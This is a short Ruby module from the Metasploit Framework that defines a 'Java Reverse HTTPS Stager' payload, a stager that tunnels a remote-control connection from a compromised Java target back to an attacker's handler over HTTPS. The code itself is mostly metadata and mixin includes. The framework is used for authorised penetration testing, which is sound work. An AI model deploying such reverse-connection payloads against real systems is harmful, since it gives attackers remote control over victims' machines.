##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_https'
require 'msf/core/payload/uuid/options'
require 'msf/core/payload/java/reverse_https'

module MetasploitModule

  CachedSize = 6195

  include Msf::Payload::Stager
  include Msf::Payload::Java
  include Msf::Payload::Java::ReverseHttps

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Java Reverse HTTPS Stager',
      'Description' => 'Tunnel communication over HTTPS',
      'Author'      => ['mihi', 'egypt', 'hdm',],
      'License'     => MSF_LICENSE,
      'Platform'    => 'java',
      'Arch'        => ARCH_JAVA,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Convention'  => 'javaurl',
      'Stager'      => {'Payload' => ''}
      ))
  end
end
